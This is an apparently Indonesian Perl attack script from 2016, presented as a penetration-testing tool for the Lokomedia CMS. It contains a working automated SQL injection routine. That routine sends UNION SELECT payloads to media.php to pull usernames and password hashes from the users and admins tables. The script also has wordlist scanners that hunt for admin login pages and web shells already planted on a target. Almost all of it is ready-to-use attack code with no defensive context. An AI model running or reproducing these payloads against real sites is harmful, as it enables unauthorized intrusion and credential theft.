#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
use LWP::Simple;

sub bantu {
	print qq{
+----------------Lokomedia auto injection----------------------------+ 
| set target = http://target.co.li                                   |
| module     = berita,statis,kategori,produk,artikel dll.            |
|  id        = id (angka)                                            |
| contoh target = http://target.co.li/berita-id-blablablabla.html    |
|              - http://target.co.li/kategori-id-anu.html            |
+--------------------------------------------------------------------+

yang lain? pasti udah tau lah~
};

}

sub maindek{
	print qq{#             #     # #       ### #     # 
#             ##   ## #    #   #  ##    # 
#             # # # # #    #   #  # #   # 
#       ##### #  #  # #    #   #  #  #  # 
#             #     # #######  #  #   # # 
#             #     #      #   #  #    ## 
#######       #     #      #  ### #     # 
\n
=======================================================================
||  WithOutShadow team  | by : shutdown57                            ||
||  (C) 2016            | CMS Lokomedia PenetrationTest tools + +    ||
=======================================================================
1  > Lokomedia 4uto injection
2  > Admin Finder
3  > Shell Finder
69 > bantu
99 > Keluar
root\@WithOutShadow:\~# };
$pil=<STDIN>;
chomp($pil);
if($pil eq "1"){
	print("root\@WithOutShadow: /Lokomedia-auto-Inject \$ Set Target >");
	$lm=<STDIN>;
	chomp($lm);
	if($lm){
		if($lm !~ /^http:/){
			$lm="http://".$lm;
		}
		print("root\@WithOutShadow: /Lokomedia-auto-Inject \$ Set module >");
		$m=<STDIN>;
		chomp($m);
		if($m){
			if($m eq "statis"){
				$m="halamanstatis";
			}else{
				$m="detail".$m;
			}
			print("root\@WithOutShadow: /Lokomedia-auto-Inject \$ Set ID >");
			$id=<STDIN>;
			chomp($id);
			if($id){
				print"-> Target : $lm \n";
				print"-> module : $m \n";
				print"-> ID     : $id \n";
				print">> Status : Mengecek keAslian Web Lokomedia...\n";
$loko=$lm."/media.php?module=home";
my $req=HTTP::Request->new(GET=>$loko);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $cekx=$ua->request($req);

if($cekx->content =~ /404|403|500|Not Found|Forbidden|Error/){
print">> Status : Web Tidak menggunakan CMSLokomedia !\n";
}else{
	print">> Status : Terdeteksi Web menggunakan Lokomedia. \n";
	print">> Status : Melanjutkan.. \n";
				@coba=('\'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,username,0x23,password,0x3c62723e)),@)--+','\'+union+select+concat(username,0x3a574f533a,password)+from+users--+',
			'\'union+select+make_set(6,@:=0x0a,(select(1)from(admins)where@:=make_set(511,@,0x23,username,0x23,password,0x3c62723e)),@)--+','\'+union+select+concat(username,0x3a574f533a,password)+from+admins--+','\'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,user,0x23,pass,0x3c62723e)),@)--+','\'+union+select+concat(user,0x3a574f533a,pass)+from+users--+',
			'\'union+select+make_set(6,@:=0x0a,(select(1)from(admins)where@:=make_set(511,@,0x23,user,0x23,pass,0x3c62723e)),@)--+','\'+union+select+concat(user,0x3a574f533a,pass)+from+admins--+');
	foreach $payload(@coba){
			$site=$lm."/media.php?module=".$m."&id=.".$id.$payload;
my $req=HTTP::Request->new(GET=>$site);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $cekx=$ua->request($req);
if($cekx->content =~ /([0-9a-fA-F]{32})/){
print "=========================================================\n";
print "[+] [INJECTED] [+] \n";
print "[!] Queries         : $site\n";
print "[!] Ketemu password : ".$1."\n";
print "=========================================================\n";
}else{
	print"=========================================================\n";
	print"[-] [TIDAK BISA] [-] \n";
	print"[!] Queries : $site\n";
	print"=========================================================\n";
}
	}
}
			}
			}}
			maindek();
	}elsif($pil eq "2"){
		print("root\@WithOutShadow: /Admin-finder \$ Set target >");
		$ta=<STDIN>;
		chomp($ta);
		if ($ta) {
			if($ta !~ /^http:/){
				$ta="http://".$ta;
			}
			print("root\@WithOutShadow: /Admin-finder \$ Wordlist [n] >");
			$wo=<STDIN>;
			chomp($wo);
			if($wo){
				if($wo eq "n" or $wo eq "N"){
					$wo="wordlists/admin_finder.txt";
				}
				open($l,"<".$wo);
				@wl=split(/,/,<$l>);
				foreach my $x (@wl) {
					$final=$ta."/".$x;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
if($response->content =~ /user|username|Username|USERNAME|pass|password|Password|PASSWORD|nama|Nama Pengguna|Masuk|Kata sandi|sandi/){
print "[+] Ketemu -> $final\n";
print "..........................................................\n";
}else{
print "[-] Gak Ketemu -> $final\n";
}
}
				}
			}
			maindek();
		}elsif($pil eq "3"){
			print("root\@WithOutShadow: /Shell-finder \$ Set target >");
			$tsf=<STDIN>;
			chomp($tsf);
			if($tsf){
			if($tsf !~ /^http:/){
				$tsf="http://".$tsf;
			}
			print("root\@WithOutShadow: /Shell-finder \$ Set Wordlist [n] >");
			$w=<STDIN>;
			chomp($w);
			if($w){
				if($w eq "n" or $w eq "N"){
					$w="wordlists/shell_finder.txt";
				}
				open($o,"<".$w);
				@wl=split(/,/,<$o>);
								foreach my $x (@wl) {
$final=$tsf."/".$x;
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
if($response->content =~ /shell|sh3ll|password|files|owner|group|action/){
print "[+] Ketemu -> $final\n";
print "..........................................................\n";
}else{
print "[-] Gak Ketemu -> $final\n";
}
}
		       }
			}
maindek();
		}elsif($pil eq "69"){
			bantu();
			maindek();
		}
	}

maindek();